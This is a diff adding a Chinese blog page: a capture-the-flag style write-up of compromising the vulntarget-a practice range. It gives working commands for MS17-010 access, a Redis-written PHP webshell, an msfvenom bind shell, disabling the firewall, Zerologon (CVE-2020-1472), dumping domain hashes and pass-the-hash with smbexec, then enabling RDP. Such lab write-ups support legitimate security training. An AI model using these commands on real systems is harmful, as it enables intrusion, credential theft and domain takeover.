@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>vulntarget-a打靶记录 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>vulntarget-a打靶记录</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%89%93%E9%9D%B6/" style="color: #03a9f4">
+                    打靶
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>‌‌vulntarget是一个漏洞靶场，旨在帮助安全专业人员练习渗透测试技术。</p>
+<span id="more"></span>
+
+<h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>使用Goby对目标进行扫描发现存在通达oa漏洞和ms17-010漏洞<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image.png" alt="image"><br>使用ms17-010漏洞进行反弹<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028012580.png" alt="image-1711028012580"><br>System权限，并且还有一个10.0.20.20网段<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028025319.png" alt="image-1711028025319"><br>上传fscan扫描10.0.20.1网段</p>
+<pre><code>upload D:\\fscan64.exe C:\\fscan.exe
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028078268.png" alt="image-1711028078268"></p>
+<pre><code>fscan -h 10.0.20.1/24 -np -no -nopoc
+</code></pre>
+<p>10.0.20.98是外网机<br>10.0.20.99是连通的一台内网机<br>10.0.20.99.扫描到一个redis未授权访问漏洞和一个web端口<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028102544.png" alt="image-1711028102544"></p>
+<h2 id="域成员"><a href="#域成员" class="headerlink" title="域成员"></a>域成员</h2><p>添加路由</p>
+<pre><code>run autoroute -s 10.0.20.1/24
+run autoroute -p
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028206062.png" alt="image-1711028206062"><br>设置socks代理<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028217833.png" alt="image-1711028217833"><br>Socks代理建立成功<br>Web页面存在<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028230404.png" alt="image-1711028230404"><br>经过测试存在redis未授权访问漏洞</p>
+<pre><code>proxychains redis-cli -h 10.0.20.99
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028258518.png" alt="image-1711028258518"><br>系统是windows，不能使用计划任务，私钥之类的，前面发现存在web端口开放<br>扫描网站发现phpinfo页面<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028286703.png" alt="image-1711028286703"><br>这里有网站的路径<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028299321.png" alt="image-1711028299321"></p>
+<h2 id="redis写shell"><a href="#redis写shell" class="headerlink" title="redis写shell"></a>redis写shell</h2><pre><code>config set dir &quot;C:/phpStudy/PHPTutorial/WWW/&quot;
+config set dbfilename shell.php
+set 1 &quot;&lt;?php assert($_GET[&#39;a&#39;]);?&gt;&quot;
+save
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028327016.png" alt="image-1711028327016"><br>访问shell<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028335898.png" alt="image-1711028335898"><br>蚁剑连接<br>10.0.20.99是这台机器，还有一个网段是10.0.10.111<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028359082.png" alt="image-1711028359082"><br>扫描10.0.10.1网段<br>发现一台10.0.10.110机器，开放的端口有135，139，445，88<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028370715.png" alt="image-1711028370715"></p>
+<h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8081 -f exe &gt; 8081_bind.exe
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028385150.png" alt="image-1711028385150"><br>msf配置<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028395868.png" alt="image-1711028395868"><br>运行后发现没有上线，查看网络连接发现端口处于监听状态<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028406477.png" alt="image-1711028406477"><br>可能是有开防火墙，尝试关闭防火墙</p>
+<pre><code>netsh firewall set opmode mode=disable
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028421240.png" alt="image-1711028421240"><br>直接收到回话了<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028430600.png" alt="image-1711028430600"><br>查看域控</p>
+<pre><code>net group &quot;domain controllers&quot; /domain
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028449204.png" alt="image-1711028449204"><br>查看域管</p>
+<pre><code>net group &quot;enterprise admins&quot; /domain
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028462903.png" alt="image-1711028462903"><br>枚举域控信息</p>
+<pre><code>run post/windows/gather/enum_domain
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028478343.png" alt="image-1711028478343"><br>Ping域控得到ip10.0.10.110<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028494087.png" alt="image-1711028494087"><br>添加路由<br>run autoroute -s 10.0.10.1&#x2F;24<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028503797.png" alt="image-1711028503797"></p>
+<h2 id="CVE-2020-1472域内提权漏洞"><a href="#CVE-2020-1472域内提权漏洞" class="headerlink" title="CVE-2020-1472域内提权漏洞"></a>CVE-2020-1472域内提权漏洞</h2><p>脚本下载地址：<br>git clone <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a><br>git clone <a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
+<p>域控密码置空</p>
+<pre><code>proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028623698.png" alt="image-1711028623698"><br>获取域管hash</p>
+<pre><code>proxychains python3 secretsdump.py vulntarget.com/WIN2019\$@10.0.10.110  -just-dc  -no-pass
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028639462.png" alt="image-1711028639462"><br>Hash解密<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711542515592.png" alt="image-1711542515592"></p>
+<p>使用smbexec连接域控</p>
+<pre><code>proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110
+</code></pre>
+<p>关闭防火墙</p>
+<pre><code>netsh firewall set opmode mode=disable
+</code></pre>
+<p>打开3389</p>
+<pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028709845.png" alt="image-1711028709845"><br>设置代理连接RDP<br><img src="/../imgs/vulntarget-a%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-1711028718021.png" alt="image-1711028718021"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
